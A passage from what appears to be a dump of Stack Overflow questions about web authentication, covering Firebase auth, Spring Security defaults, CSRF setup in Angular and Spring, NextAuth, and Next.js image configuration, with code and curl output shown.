  &quot;@angular/common&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/compiler&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/core&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/fire&quot;: &quot;^7.6.1&quot;,
  &quot;@angular/forms&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/platform-browser&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/platform-browser-dynamic&quot;: &quot;^14.2.0&quot;,
  &quot;@angular/router&quot;: &quot;^14.2.0&quot;,
  &quot;firebase&quot;: &quot;^10.8.0&quot;,
  &quot;flag-icons&quot;: &quot;^7.1.0&quot;,
  &quot;jspdf&quot;: &quot;^2.5.1&quot;,
  &quot;lodash&quot;: &quot;^4.17.21&quot;,
  &quot;moment&quot;: &quot;^2.29.4&quot;,
 },
&quot;devDependencies&quot;: {
  &quot;@angular-devkit/build-angular&quot;: &quot;^14.2.11&quot;,
  &quot;@angular/cli&quot;: &quot;~14.2.11&quot;,
  &quot;@angular/compiler-cli&quot;: &quot;^14.2.0&quot;,
} 
</code></pre>
<p>I can confirm that my server is not blocking any port anything as I am using the same server for a different project and it's working perfectly. The only change is that a different project has been created on Firebase for this product. I have added the domain to the authorized domain list too.</p>
<p>Even it is working in our test Dev environment. We tried with removing node modules &amp; package-lock.json.</p>
<p>Tried with downgrading with Angular CLI version as well as Angular Firebase related modules upgrade &amp; downgrade. Nothing is working in Live. We need help as we are stuck in our Live environment &amp; the project is on hold for Phone Auth.</p>
"
"<p>What difference does <code>anyExchange().authenticated()</code> really make? Consider this MRE:</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.example&lt;/groupId&gt;
    &lt;artifactId&gt;security-mre&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;security-mre&lt;/name&gt;
    &lt;description&gt;security-mre&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;
            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.controller;

import com.example.securitymre.data.Hello;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {
    @GetMapping(&quot;/hello&quot;)
    public Hello getHello() {
        return new Hello();
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.data;

import lombok.Getter;
import lombok.NoArgsConstructor;

@NoArgsConstructor
@Getter
public class Hello {
    private final String message = &quot;Hello!&quot;;
}
</code></pre>
<p>I hardly wrote any code, no security config, and yet</p>
<pre class=""lang-none prettyprint-override""><code>curl -i localhost:8080/hello
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm=&quot;Realm&quot;
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 0
Referrer-Policy: no-referrer
content-length: 0
</code></pre>
<p><strong>I'm already barred from using my application unauthenticated</strong></p>
<p>Experiment #2</p>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.data;

import lombok.Getter;
import lombok.NoArgsConstructor;

@NoArgsConstructor
@Getter
public class Hello {
    private String message = &quot;Hello!&quot;;

    public Hello(String message) {
        this.message = message;
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.controller;

import com.example.securitymre.data.Hello;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {
    @GetMapping(&quot;/hello&quot;)
    public Hello getHello() {
        return new Hello();
    }
    @GetMapping(&quot;/secured-hello&quot;)
    public Hello getSecuredHello() {
        return new Hello(&quot;Secured hello!&quot;);
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.web.server.SecurityWebFilterChain;

@Configuration
@EnableWebFluxSecurity
public class SecurityConfig {
    @Bean
    public SecurityWebFilterChain securityFilterChain(ServerHttpSecurity security) {
        return security
                .authorizeExchange(authorizeExchangeSpec -&gt; authorizeExchangeSpec
                        .pathMatchers(&quot;/hello&quot;).permitAll()
                        .anyExchange()/* by &quot;any&quot; we mean GET /secured-hello */.authenticated()
                )
                .build();
    }
}
</code></pre>
<pre class=""lang-none prettyprint-override""><code>curl -i localhost:8080/hello                                                         
HTTP/1.1 200 OK                                                                                     
Content-Type: application/json                                                                      
Content-Length: 20                                                                                  
Cache-Control: no-cache, no-store, max-age=0, must-revalidate                                       
Pragma: no-cache                                                                                    
Expires: 0                                                                                          
X-Content-Type-Options: nosniff                                                                     
X-Frame-Options: DENY                                                                               
X-XSS-Protection: 0                                                                                 
Referrer-Policy: no-referrer                                                                                                                                                                            
{&quot;message&quot;:&quot;Hello!&quot;}
                                                                                
curl -i localhost:8080/secured-hello                                                 
HTTP/1.1 401 Unauthorized                                                                           
WWW-Authenticate: Basic realm=&quot;Realm&quot;                                                               
Cache-Control: no-cache, no-store, max-age=0, must-revalidate                                       
Pragma: no-cache                                                                                    
Expires: 0                                                                                          
X-Content-Type-Options: nosniff                                                                     
X-Frame-Options: DENY                                                                               
X-XSS-Protection: 0                                                                                 
Referrer-Policy: no-referrer                                                                        
content-length: 0  
</code></pre>
<p>Or without <code>anyExchange().authenticated()</code>:</p>
<pre class=""lang-java prettyprint-override""><code>package com.example.securitymre.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.web.server.SecurityWebFilterChain;

@Configuration
@EnableWebFluxSecurity
public class SecurityConfig {
    @Bean
    public SecurityWebFilterChain securityFilterChain(ServerHttpSecurity security) {
        return security
                .authorizeExchange(authorizeExchangeSpec -&gt; authorizeExchangeSpec
                        .pathMatchers(&quot;/hello&quot;).permitAll()
                )
                .build();
    }
}
</code></pre>
<pre class=""lang-none prettyprint-override""><code>curl -i localhost:8080/hello                                                         
HTTP/1.1 200 OK                                                                                     
Content-Type: application/json                                                                      
Content-Length: 20                                                                                  
Cache-Control: no-cache, no-store, max-age=0, must-revalidate                                       
Pragma: no-cache                                                                                    
Expires: 0                                                                                          
X-Content-Type-Options: nosniff                                                                     
X-Frame-Options: DENY                                                                               
X-XSS-Protection: 0                                                                                 
Referrer-Policy: no-referrer                                                                                                                                                                            
{&quot;message&quot;:&quot;Hello!&quot;}  
                                                                              
curl -i localhost:8080/secured-hello                                                 
HTTP/1.1 401 Unauthorized                                                                           
WWW-Authenticate: Basic realm=&quot;Realm&quot;                                                               
Cache-Control: no-cache, no-store, max-age=0, must-revalidate                                       
Pragma: no-cache                                                                                    
Expires: 0                                                                                          
X-Content-Type-Options: nosniff                                                                     
X-Frame-Options: DENY                                                                               
X-XSS-Protection: 0                                                                                 
Referrer-Policy: no-referrer                                                                        
content-length: 0  
</code></pre>
<p>Literally, zero difference</p>
<p>I don't claim to have a lot of experience, but in each project I worked on, had that <code>anyRequest().authenticated()</code> line. Now it appears it's some default, and it doesn't have any practical purpose</p>
<p>Am I missing something? What does that line do, exactly?</p>
"
"<p>I am using <strong>Angular 17</strong> and <strong>Spring Boot</strong> with <strong>Spring Security 6</strong>.</p>
<p>As it states in Angular <a href=""https://angular.io/guide/http-security-xsrf-protection"" rel=""nofollow noreferrer"">documentation</a>, when performing HTTP requests, an interceptor reads a token from a cookie, by default XSRF-TOKEN, and sets it as an HTTP header, X-XSRF-TOKEN. For this, in Angular I added</p>
<pre><code>importProvidersFrom([
  HttpClientXsrfModule.withOptions({
    cookieName: &quot;XSRF-TOKEN&quot;,
    headerName: &quot;X-XSRF-TOKEN&quot;,
  }),
]),
</code></pre>
<p>Now taking a look at Spring <a href=""https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html#csrf-integration-javascript"" rel=""nofollow noreferrer"">documentation</a> I can construct this configuration for CSRF:</p>
<pre><code>@Bean
fun filterChain(httpSecurity: HttpSecurity): SecurityFilterChain {
    val tokenRepository = CookieCsrfTokenRepository.withHttpOnlyFalse()
    tokenRepository.cookiePath = &quot;/&quot;

    val delegate = XorCsrfTokenRequestAttributeHandler()
    delegate.setCsrfRequestAttributeName(&quot;_csrf&quot;)

    val requestHandler = CsrfTokenRequestHandler(delegate::handle)

    return httpSecurity
        .csrf { configurer -&gt;
            configurer
                .csrfTokenRepository(tokenRepository)
                .csrfTokenRequestHandler(requestHandler)
        }
        .cors(Customizer.withDefaults&lt;CorsConfigurer&lt;HttpSecurity&gt;&gt;())
        &lt;...&gt;
</code></pre>
<p>Also, CorsMapping, where Angular runs on <code>localhost:4200</code> port:</p>
<pre><code>override fun addCorsMappings(registry: CorsRegistry) {
    registry
        .addMapping(&quot;/**&quot;)
        .allowedOrigins(&quot;http://localhost:4200&quot;)
        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;)
        .allowedHeaders(&quot;Content-Type&quot;, &quot;X-XSRF-TOKEN&quot;)
        .allowCredentials(true)
}
</code></pre>
<p>When trying to perform login:</p>
<p><a href=""https://i.stack.imgur.com/zZO6G.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zZO6G.png"" alt=""enter image description here"" /></a></p>
<p>I tried removing <code>http://</code> part from the request, but then Angular requests show:</p>
<p><a href=""https://i.stack.imgur.com/UI5rr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UI5rr.png"" alt=""enter image description here"" /></a></p>
<p>When I perform login via <strong>Postman</strong>, everything works on first attempt - I get newly set XSRF-TOKEN in a cookie and X-XSRF-TOKEN in a header.</p>
<p>What am I missing here? Thanks.</p>
"
"<p>I have a spring jersey based web application which is currently running on spring version 5.0. It does not have any UI. It exposes only REST API endpoints for it's clients to consume them. It is running on Tomcat 9 now. Authentication happens using SSL mutual auth (client and server certificates). spring-security intercepts the incoming requests and applies the logic written in custom auth providers. spring-security configuration is there in a custom xml file as shown below.</p>
<pre><code>&lt;security:http auto-config='true' authentication-manager-ref=&quot;authenticationManager&quot; create-session=&quot;stateless&quot;&gt;
    &lt;security:intercept-url pattern=&quot;/order-mgmt/v1/*&quot; access=&quot;hasAnyRole('ROLE_MUTUAL')&quot;/&gt;
    &lt;security:intercept-url pattern=&quot;/order-mgmt/v2/*&quot; access=&quot;hasAnyRole('ROLE_MUTUAL')&quot;/&gt;
    &lt;security:custom-filter ref=&quot;customAuthFilter&quot; /&gt;
    &lt;security:csrf disabled=&quot;true&quot; /&gt;
&lt;/security:http&gt;
</code></pre>
<p>Problem is after I upgraded my spring framework to version 6 and tomcat to version 10 any API call (/order-mgmt/v1/* or /order-mgmt/v2/*) to my application is getting redirected (http status 302) to some /login screen by spring-security and then it fails with http status 404. I am seeing the 302 re-direction and 404 error in my tomcat's access logs I don't have any login page and neither I want to introduce any such screen. This is a very strange behaviour and totally blocking me in my work. Any help is highly appreciated.</p>
"
"<p>I have a sign in form where user can auth with email link form firebase. After that in gmail user clicks on link and navigates to some route where he should be authenticated but it doesn't happen. Is my sendSignInLinkToEmail logic correct? Also i made sure that i have allowed sign in with email link.</p>
<p>Form</p>
<pre><code>export const SignIn = () =&gt; {
  return (
    &lt;Formik
      onSubmit={(values, { setSubmitting }) =&gt; {
        sendSignInLinkToEmail(auth, values.email, actionCodeSettings)
          .then(() =&gt; {
            window.localStorage.setItem(&quot;emailForSignIn&quot;, values.email);
            setAlertLabel(&quot;A sign-in link has been sent to your email&quot;);
          })
          .catch(() =&gt;
            setAlertLabel(
              &quot;Something went wrong while sending the sign-in link. Please try again later&quot;
            )
          );
        setSubmitting(false);
      }}
    &gt;
      {({ values, handleSubmit, handleChange }) =&gt; {
        return (
         ...
        );
      }}
    &lt;/Formik&gt;
  );
};
</code></pre>
<p>Config</p>
<pre><code>const actionCodeSettings = {
  url: &quot;http://localhost:3000&quot;,
  handleCodeInApp: true,
};

</code></pre>
"
"<p>I'm trying to display a message that reads &quot;Welcome, FirstName&quot;. I'm getting the first name from a firestore collection called 'useraccounts'.</p>
<p>Here's the related code:</p>
<pre><code>import { doc, getDoc, getFirestore } from 'firebase/firestore';
import {auth} from '../firebase';

const Main = () =&gt; {
   const db = getFirestore()
   const [user, setUser] = useState(&quot;&quot;);

   // getting the logged-in user 
   const currentUser = auth.currentUser;

const getUser = async () =&gt; {
  
  let userEmail = currentUser.email
  
  //undefined on first load or browser reload, but fine when I reload the code 
  console.log(&quot;userEmail: &quot;, userEmail); 

  // the firestore bits
  const docRef = doc(db, 'useraccounts', userEmail)
  const docSnap = await getDoc(docRef)

  // checking to see if the user logged in has a user account record 
  // in the 'useraccounts' collection
  if (docSnap.exists()){
    setUser(docSnap.data().first);
  } else {
    //this doesn't show when it's undefined either by the way
    console.log(&quot;nothing here&quot;); 
  }      
}

// calling it on load and reload...or so I thought
useEffect(() =&gt; {       
   getUser();
},[])
</code></pre>
<p>The problem? - It doesn't show me the name on load/refresh. But if I change some arbitrary stuff in the code to force a refresh, it shows. Thus, showing symptoms of a racing condition.</p>
<p>Placing the getUser() inside the useEffect does nothing different</p>
"
"<p>This is my next.config.mjs file. I am creating PWA application using firebase to store images. but when I use <code>&lt;Image/&gt;</code> tag I received below error. how can I fix it?</p>
<blockquote>
<p>Error: Invalid src prop (<a href=""https://firebasestorage.googleapis.com/v0/b/cyberpolaimageupload.appspot.com/o/images%2Fvegitableshop.jpg?alt=media&amp;token=f4e10fa9-a44c-4447-a13a-b218a7ed7241"" rel=""nofollow noreferrer"">https://firebasestorage.googleapis.com/v0/b/cyberpolaimageupload.appspot.com/o/images%2Fvegitableshop.jpg?alt=media&amp;token=f4e10fa9-a44c-4447-a13a-b218a7ed7241</a>) on 'next/image', hostname &quot;firebasestorage.googleapis.com&quot; is not configured under images in your 'next.config.js'
See more info: <a href=""https://nextjs.org/docs/messages/next-image-unconfigured-host"" rel=""nofollow noreferrer"">https://nextjs.org/docs/messages/next-image-unconfigured-host</a></p>
</blockquote>
<pre><code>/** @type {import('next').NextConfig} */
const nextConfig = {};

import withPWAInit from &quot;@ducanh2912/next-pwa&quot;;


const withPWA = withPWAInit({
    dest: &quot;public&quot;,
    cacheOnFrontEndNav: true,
    aggressiveFrontEndNavCaching: true,
    reloadOnOnline: true,
    swcMinify: true,
    disable: false,
    workboxOptions: {
        disableDevLogs: true,
    },
      images: {
        remotePatterns: [
          {
            protocol: 'https',
            hostname: 'firebasestorage.googleapis.com',
            port: '',
            pathname: '/v0/b/cyberpolaimageupload.appspot.com/o/images/',
          },
        ],
      },
});



export default withPWA(nextConfig);
</code></pre>
"
"<p><em><strong>TLTR:</strong></em> <em>Looking to improve authentication flow with NextAuth and FirebaseAuth when having a 3rd Party API call that fetches workspace and revalidates Bearer Token (using firebase-admin) upon call.</em></p>
<p>Hey, I encountered an issue while fetching content from a Laravel API.</p>
<p>I am using the Next.js App Router with NextAuth and FirebaseAuth.</p>
<p>The flow goes like this: I pass login details to signInWithEmailAndPassword, then I use signIn('credentials') to pass the tokenId. During the signIn flow, I send a POST request to get the workspace info, ensuring a user is linked to a workspace.</p>
<p><strong>CredentialProvider (nextAuth)</strong></p>
<pre><code>  authorize: async ({ idToken }: any, _req) =&gt; {
    if (idToken) { 
      try { 
        const decoded = await firebaseAdmin.auth().verifyIdToken(idToken); 
        const scheme = await getSchemeOnLogin(idToken); 
        return { ...decoded } 
      } catch (err) { 
        console.error(err);           
      }         
    }
      return null;  
  }
</code></pre>
<p><strong>getWorkspaceInfo</strong></p>
<pre><code>  return new Promise(async (resolve, reject) =&gt; {
    try { 
      await new Promise(resolve =&gt; setTimeout(resolve, 3000));
      await fetch('http://localhost:8000/api/v1/workspace', { 
        method: 'POST', 
        headers: {
          'Content-Type': 'application/json', 
          Authorization: Bearer ${token}, 
        },      
      })       
      .then(async (res) =&gt; { 
        if (!res.ok) { 
          reject('Error Occurred while fetching user data');
        }
        const responseData = await res.json(); // Save to local storage
        console.log(responseData);
        resolve(responseData); 
      }); 
    } catch (err) { 
      reject(err);
    }
  });
</code></pre>
<p>On the backend, I revalidate the token I receive using firebase-admin, after which I either send a 200 status or a 401.</p>
<pre><code>  public function login(Request $request) {
    if (!$this-&gt;isTokenValid($request)) { 
      return $this-&gt;getJsonResponse(&quot;error&quot;, &quot;User not Logged In&quot;,sonResponse::HTTP_UNAUTHORIZED); 
    }
    return $this-&gt;getJsonResponse(&quot;success&quot;, &quot;Successfully Obtained Workspace Details&quot;, JsonResponse::HTTP_OK, $infoString);   }
</code></pre>
<p>The issue arises when I send the request to Laravel. It keeps returning a 401 status. What helped was implementing a timeout of 3 seconds, which is rather hacky.</p>
<p>Thanks!</p>
"
"<p>If a user is originally authenticated with a Google Provider and I allow the user to <code>linkWithCredential</code> via the password Provider, it seems to update my primary email address in Firebase auth, even without email verification.</p>
<p>This is not desired, the original Google Provider email address should be maintained.</p>
<p>I'm using Vue3, Pinia and of course Firebase auth to handle this but I can't seem to figure out a way around Firebase's updateEmail method automatically doing this for me. Somehow it seems to bypass Firebase's security measures, or may be working as intended??</p>
<p>Even if I unlink the password Provider (which is now the primary email in Firebase auth) it still seems to keep that as the primary email, when in fact I have logic to revert to Google Provider email.</p>
<p>Essentially my goal is to allow a user to link a new provider to their existing account, without updating the primary email address. Offer a way to unlink either the Google Provider or Password Provider while gracefully reverting back to the prior method or alternative method (reauthenticating here is fine too).</p>
<p>Any advice tips based on my crude code snippets? <em>(not full code for both files)</em></p>
<p>Vue component:</p>
<pre><code>// Authentication (Email / Google Providers)
const authFirebase = getAuth();
const showEmailChangeFields = ref(false);
const password = ref('');
const googleSignInLogo = ref(googleLogo);
const canResendEmail = ref(true);
const connectWithGoogle = async () =&gt; {
    try {
        const result = await authStore.linkGoogleAccount();
        if (result.success) {
            successMessage.value = result.message;
        } else {
            error.value = result.message;
        }
    } catch (err) {
        console.error('Error connecting with Google:', err);
        error.value = err.message || 'Failed to connect Google account. Please try again.';
    }
};

const hasEmailProvider = computed(() =&gt; {
    return authStore.user.providerData.some((data) =&gt; data.providerId === 'password');
});

const hasGoogleProvider = computed(() =&gt; {
    return authStore.user.providerData.some((data) =&gt; data.providerId === 'google.com');
});

const showConnectGoogleOption = computed(() =&gt; {
    return !hasGoogleProvider.value &amp;&amp; hasEmailProvider.value;
});

const showAddEmailOption = computed(() =&gt; {
    return hasGoogleProvider.value &amp;&amp; !hasEmailProvider.value;
});

const resendVerificationEmail = async () =&gt; {
    console.log('Attempting to resend verification email');
    if (!canResendEmail.value) {
        console.log('Resending too soon');
        return;
    }
    canResendEmail.value = false;
    try {
        await authStore.sendEmailVerification();
        console.log('Verification email sent successfully');
        successMessage.value = 'Verification email sent. Please check your inbox.';
        setTimeout(() =&gt; {
            canResendEmail.value = true;
        }, 60000);
    } catch (error) {
        console.error('Error sending verification email:', error);
        error.value = 'Failed to send verification email. Please try again.';
        canResendEmail.value = true;
    }
};

const sendVerificationForEmailAddition = async () =&gt; {
    console.log('Attempting to add email:', newEmail.value);
    if (!newEmail.value || !password.value) {
        console.log('Missing email or password');
        error.value = 'Both new email and password must be provided.';
        return;
    }
    if (!canResendEmail.value) {
        console.log('Resending too soon');
        error.value = 'Please wait before resending the verification email.';
        return;
    }
    try {
        // This method should only link the email/password without updating the primary email.
        const result = await authStore.linkEmailAndPassword(newEmail.value, password.value);
        console.log('linkEmailAndPassword result:', result);
        if (result.success) {
            await authStore.refreshUser();

            successMessage.value = 'Verification email sent. Please check your inbox.';
        } else {
            error.value = result.message;
        }
        // Reset UI state
        newEmail.value = '';
        password.value = '';
        showEmailChangeFields.value = false;
        canResendEmail.value = false;
        setTimeout(() =&gt; {
            canResendEmail.value = true;
        }, 60000);
    } catch (err) {
        console.error('Error during email addition:', err);
        error.value = err.message || 'Failed to add email. Please try again.';
    }
};

const makeEmailPrimary = async (email) =&gt; {
    console.log('Attempting to set primary email:', email);
    try {
        if (authStore.user.email === email) {
            throw new Error('This email is already set as primary.');
        }

        // If the new primary email is from Google, re-authenticate the user first.
        if (email === authStore.user.providerData.find(pd =&gt; pd.providerId === 'google.com')?.email) {
            // Trigger re-authentication flow here.
            await authStore.reauthenticateGoogle();
        }

        // After successful re-authentication, or if no re-authentication was necessary, update the primary email.
        const updateResult = await authStore.makeEmailPrimary(email);
        if (updateResult.success) {
            successMessage.value = 'Primary email updated successfully.';
            // Optionally log the updated primary email for confirmation.
            authStore.logPrimaryEmail();
        } else {
            throw new Error(updateResult.message);
        }
    } catch (error) {
        console.error('Error during email primary update:', error);
        return { success: false, message: `Failed to update primary email: ${error.message}` };
    }
};

const unlinkProvider = async (providerId) =&gt; {
    console.log('Attempting to unlink provider:', providerId);
    try {
        if (authStore.user.providerData.length &gt; 1) {
            await unlink(authFirebase.currentUser, providerId);
            console.log(`Provider ${providerId} unlinked successfully`);

            if (providerId === 'password') {
                const googleProviderData = authStore.user.providerData.find(pd =&gt; pd.providerId === 'google.com');
                if (googleProviderData &amp;&amp; googleProviderData.email) {
                    try {
                        // Attempt to update the email back to the Google one.
                        await updateEmail(authFirebase.currentUser, googleProviderData.email);
                        console.log('Firebase Auth email reverted to Google email:', googleProviderData.email);
                        await authStore.updateUserInfo({ email: googleProviderData.email });
                    } catch (error) {
                        if (error.code === 'auth/requires-recent-login') {
                            console.log('User needs to re-authenticate to update their email.');
                        } else {
                            console.error('Error updating email:', error);
                        }
                    }
                } else {
                    console.log('Google email not found or user not signed in with Google.');
                }
            }
            successMessage.value = `Successfully unlinked ${getProviderName(providerId)}`;
            await authStore.refreshUser(); // Refresh local user data to reflect changes
        } else {
            console.log('Cannot unlink the last remaining provider');
            error.value = 'You cannot unlink the last remaining provider.';
        }
    } catch (err) {
        console.error(`Error unlinking ${getProviderName(providerId)}:`, err);
        error.value = `Failed to unlink ${getProviderName(providerId)}. Please try again.`;
    }
};

const getProviderName = (providerId) =&gt; {
    switch (providerId) {
        case 'password':
            return 'Email';
        case 'google.com':
            return 'Google';
        // Add more cases as needed
        default:
            return providerId; // Or format as you like
    }
};
</code></pre>
<p><strong>Pinia Store</strong></p>
<pre><code>// stores/authStore.js
import { defineStore } from 'pinia'
import { auth, storage, firestore } from '@/firebaseConfig'
import {
  signInWithEmailAndPassword,
  GoogleAuthProvider,
  linkWithPopup,
  getAuth,
  updateProfile,
  sendEmailVerification,
  signOut,
  onAuthStateChanged,
  updateEmail,
  EmailAuthProvider,
  linkWithCredential,
  signInWithRedirect,
  signInWithPopup,
  getRedirectResult
} from 'firebase/auth'
import { doc, setDoc, getDoc, updateDoc } from 'firebase/firestore'
import { useSlidesStore } from '@/stores/slidesStore'
import { ref as storageRef, getDownloadURL, uploadBytes, deleteObject } from 'firebase/storage'
import defaultAvatar from '@/assets/avatar@2x.png'
import { createAvatar } from '@dicebear/core'
import * as styles from '@dicebear/collection'
export const useAuthStore = defineStore('auth', {
  state: () =&gt; ({
    initialAuthCompleted: false,
    loading: true,
    user: null,
    isAuthenticated: false,
    defaultPhotoURL: defaultAvatar,
    photoStoragePath: null,
    fullName: null,
    url: null,
    organization: null,
    location: null,
    email: null,
    displayName: null
  }),
  actions: {
// Update user state and authentication status
    setUser(user) {
      this.user = user
      this.isAuthenticated = !!user // Convert the `user` to a boolean to represent authentication status
    },
    setEmailVerified() {
      if (this.user) {
        this.user.emailVerified = true
      }
    },
    logPrimaryEmail() {
      const currentUser = getAuth().currentUser
      if (currentUser) {
        console.log('Primary email:', currentUser.email)
      } else {
        console.log('No user currently signed in.')
      }
    },
// other code
async linkEmailAndPassword(newEmail, newPassword) {
      const currentUser = getAuth().currentUser
      if (currentUser) {
        try {
          console.log('Linking new email:', newEmail)
          const credential = EmailAuthProvider.credential(newEmail, newPassword)
          await linkWithCredential(currentUser, credential)
          console.log('Email linked successfully, sending verification email.')

          // Now, send a verification email
          await sendEmailVerification(currentUser)

          // Update the user's email in Firestore
          const userDocRef = doc(firestore, 'users', currentUser.uid)
          await updateDoc(userDocRef, {
            email: newEmail, // Update Firestore with the new email
            emailVerified: false // Set emailVerified to false until the user verifies it
          })

          // Refresh Pinia authStore state
          this.setUser({ ...this.user, email: newEmail, emailVerified: false })

          return {
            success: true,
            message: 'New email linked successfully. Please verify your email.'
          }
        } catch (error) {
          console.error('Error linking new email:', error)
          throw error
        }
      } else {
        throw new Error('No user currently signed in.')
      }
    },

    async makeEmailPrimary(newEmail) {
      const currentUser = getAuth().currentUser
      if (currentUser &amp;&amp; newEmail !== currentUser.email) {
        try {
          // The reauthentication should have just occurred before this action is triggered.
          await updateEmail(currentUser, newEmail)

          // Update Firestore and local authStore only after successful email update.
          const userDocRef = doc(firestore, 'users', currentUser.uid)
          await updateDoc(userDocRef, { email: newEmail })

          this.setUser({ ...this.user, email: newEmail }) // Update the local state.

          return { success: true, message: 'Primary email updated successfully.' }
        } catch (error) {
          console.error('Error updating primary email:', error)
          return { success: false, message: `Failed to update primary email: ${error.message}` }
        }
      } else {
        return {
          success: false,
          message: 'New email is the same as the current one or no user signed in.'
        }
      }
    },
  }
})
// Reactive Firebase auth state listener
onAuthStateChanged(auth, (user) =&gt; {
  const authStore = useAuthStore()
  authStore.setUser(user) // Update the store with the current user
})
</code></pre>
"
"<p>I'm using Firebase authentication in my React web app, and it's generally stable. However, there's a concerning issue where users occasionally get logged out for no apparent reason within minutes of logging in. To be more specific, while using onAuthStateChanged to monitor the authentication state as recommended in the <a href=""https://firebase.google.com/docs/auth/web/manage-users"" rel=""nofollow noreferrer"">document</a>, the callback is occasionally triggered with null as the parameter, even though no user action has caused this change.</p>
<p>This issue seems to be browser-specific. For instance, if it happens in Chrome, Safari might work fine, and vice versa. Interestingly, a simple browser restart resolves the problem. This leads me to believe the issue might be related to locally stored authentication data getting corrupted somehow.</p>
<p>The exact cause remains unclear, but it appears to occur under these circumstances:</p>
<ol>
<li>Hot Reloading During Development: This is frequent during development and shouldn't affect actual users.</li>
<li>Frequent Login/Logout: Reported by an operator using the online app, but likely not a common user behavior.</li>
<li>Login Retries after Failure (e.g., Network Issues): This is a major concern because we can't control user internet conditions. The current &quot;fix&quot; (browser restart) is a poor user experience.</li>
</ol>
<p>I implemented a dedicated client file that manages all Firebase Authentication SDK access. To isolate the issue, I implemented temporary logging within the functions (not included). This confirmed no SDK calls are made before the authentication state is lost.</p>
<p>Looking for Help:</p>
<p>Given these observations, are there any recommended debugging strategies to pinpoint the root cause of this issue?</p>
<p>My implementation of the client is here:</p>
<pre><code>import { initializeApp } from 'firebase/app';
import * as Auth from 'firebase/auth';

import firebaseConfig from 'common/configs/firebase';

/**
 * The type of the Firebase user.
 */
type FirebaseUser = Auth.User;

/**
 * Authentication provider enum.
 */
enum AuthenticationProvider {
  /**
   * Performing login with email and password.
   */
